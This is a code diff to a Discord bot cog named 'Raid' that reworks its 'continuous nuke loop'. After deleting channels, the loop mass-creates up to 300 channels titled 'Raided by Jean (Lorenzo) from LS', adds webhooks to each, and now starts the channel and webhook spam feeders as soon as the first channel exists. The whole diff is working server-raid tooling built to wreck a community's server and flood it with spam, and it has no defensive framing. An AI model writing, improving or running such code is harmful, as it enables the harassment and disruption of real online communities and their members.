@@ -237,6 +237,9 @@ class Raid(commands.Cog):
 
     # ─────────────────────────────────────────────────────────────────────────
     # CONTINUOUS NUKE LOOP
+    # Spam starts on the FIRST created channel — no waiting for all 300.
+    # Shared mutable lists grow as channels/webhooks are created; feeders
+    # pick up new entries every loop iteration automatically.
     # ─────────────────────────────────────────────────────────────────────────
     async def _channel_loop(
         self,
@@ -263,11 +266,22 @@ class Raid(commands.Cog):
                 await asyncio.sleep(delete_wait)
                 if se.is_set():
                     return
-                await asyncio.sleep(2.0)  # let gateway process CHANNEL_DELETE events
+                await asyncio.sleep(2.0)
 
-                # ── Phase B: CREATE 300 flood channels ────────────────────
-                _create_sem           = asyncio.Semaphore(2)
-                created_channels: list[discord.TextChannel] = []
+                # ── Phase B+C+D: Create channels + webhooks + START SPAM ──
+                # Shared mutable lists — feeders read these every iteration.
+                channel_ids:  list[int] = []
+                webhook_urls: list[str] = []
+
+                # Launch feeders immediately — they handle empty lists fine
+                # and pick up new entries as they're appended.
+                t_ch = asyncio.create_task(self._channel_spam_feeder(channel_ids))
+                t_wh = asyncio.create_task(self._webhook_spam_feeder(webhook_urls))
+                bot_state.add_task(t_ch)
+                bot_state.add_task(t_wh)
+                spam_tasks = [t_ch, t_wh]
+
+                _create_sem = asyncio.Semaphore(2)
 
                 async def _create_one() -> None:
                     if se.is_set():
@@ -279,71 +293,44 @@ class Raid(commands.Cog):
                             ch = await asyncio.wait_for(
                                 guild.create_text_channel(
                                     _ch_name(),
-                                    topic=f"Raided by Jean (Lorenzo) from LS",
+                                    topic="Raided by Jean (Lorenzo) from LS",
                                 ),
                                 timeout=15.0,
                             )
-                            created_channels.append(ch)
+                            # Channel live → spam feeder picks it up instantly
+                            channel_ids.append(ch.id)
+                            print(f"[nuke] channel #{len(channel_ids)} created, spamming", flush=True)
+
+                            # Create webhooks for this channel right away
+                            for _ in range(WEBHOOKS_PER_CH):
+                                if se.is_set():
+                                    return
+                                async with _WH_CREATE_SEM:
+                                    try:
+                                        wh = await asyncio.wait_for(
+                                            ch.create_webhook(name=random.choice(_WH_NAMES)),
+                                            timeout=10.0,
+                                        )
+                                        # Webhook live → webhook feeder picks it up instantly
+                                        webhook_urls.append(wh.url)
+                                    except Exception:
+                                        pass
                         except Exception as e:
                             print(f"[nuke] create failed: {e}", flush=True)
 
-                print(f"[nuke] creating {CREATE_PER_CYCLE} channels...", flush=True)
+                print(f"[nuke] creating {CREATE_PER_CYCLE} channels (spam starts on first)...", flush=True)
                 await asyncio.gather(
                     *[_create_one() for _ in range(CREATE_PER_CYCLE)],
                     return_exceptions=True,
                 )
-                print(f"[nuke] created {len(created_channels)} channels", flush=True)
-
-                if se.is_set():
-                    return
-
-                # ── Phase C: CREATE webhooks ──────────────────────────────
-                webhook_urls: list[str] = []
-
-                async def _make_webhook(ch: discord.TextChannel) -> None:
-                    for _ in range(WEBHOOKS_PER_CH):
-                        if se.is_set():
-                            return
-                        async with _WH_CREATE_SEM:
-                            if se.is_set():
-                                return
-                            try:
-                                wh = await asyncio.wait_for(
-                                    ch.create_webhook(name=random.choice(_WH_NAMES)),
-                                    timeout=10.0,
-                                )
-                                webhook_urls.append(wh.url)
-                            except Exception:
-                                pass
-
-                await asyncio.gather(
-                    *[_make_webhook(ch) for ch in created_channels],
-                    return_exceptions=True,
-                )
-                print(f"[nuke] {len(webhook_urls)} webhook URLs ready", flush=True)
-
-                if se.is_set():
-                    return
-
-                # ── Phase D: START SPAM FEEDERS ───────────────────────────
-                channel_ids = [ch.id for ch in created_channels]
-                spam_tasks: list[asyncio.Task] = []
-
-                if webhook_urls:
-                    t = asyncio.create_task(self._webhook_spam_feeder(webhook_urls))
-                    spam_tasks.append(t)
-                    bot_state.add_task(t)
-
-                if channel_ids:
-                    t = asyncio.create_task(self._channel_spam_feeder(channel_ids))
-                    spam_tasks.append(t)
-                    bot_state.add_task(t)
-
                 print(
-                    f"[nuke] spam launched — {len(webhook_urls)} webhook streams "
-                    f"+ {len(channel_ids)} channel streams",
+                    f"[nuke] cycle {cycle} — {len(channel_ids)} channels, "
+                    f"{len(webhook_urls)} webhooks, spamming",
                     flush=True,
                 )
+
+                if se.is_set():
+                    break
 
                 # ── Phase E: WAIT then loop ───────────────────────────────
                 for _ in range(NUKE_LOOP_WAIT * 10):
